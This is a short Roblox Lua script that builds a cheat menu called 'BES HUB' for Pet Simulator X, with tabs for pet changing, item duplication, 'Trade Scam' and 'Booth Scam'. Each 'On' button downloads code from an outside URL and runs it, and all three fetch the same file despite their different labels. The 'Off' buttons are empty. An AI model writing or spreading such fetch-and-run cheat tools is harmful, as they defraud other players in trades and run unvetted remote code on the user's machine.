local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local window = kavoUi.CreateLib("BES HUB | 💖 Pet Simulator X! 🐾","BloodTheme")

---Tabs

local Tab1 = window:NewTab("Pet Changer")
local Tab1Section = Tab1:NewSection("Pet Changer")
local Tab2 = window:NewTab("Dupe")
local Tab2Section = Tab2:NewSection("Dupe")
local Tab3 = window:NewTab("Trade Scam")
local Tab3Section = Tab3:NewSection("Trade Scam")
local Tab4 = window:NewTab("Booth Scam")
local Tab4Section = Tab4:NewSection("Coming Soon")
local Tab5 = window:NewTab("Credits")
local Tab5Section = Tab5:NewSection("Credits to Kurdapia#9323")



---Buttons

Tab1Section:NewButton("On","turn on the pet changer",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Clarksds/script/main/PetChanger", true))()
	end)
	Tab1Section:NewButton("Off","turn off the pet changer",function()
	end)
	Tab2Section:NewButton("On","turn on the dupe",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Clarksds/script/main/PetChanger", true))()
	end)
	Tab2Section:NewButton("Off","turn off the pet changer",function()
	end)
	Tab3Section:NewButton("On","turn on trade scam",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Clarksds/script/main/PetChanger", true))()
	end)
	Tab3Section:NewButton("Off","turn off trade scam",function()
	end)
Tab5Section:NewLabel("Created by Kurdapia#9323")
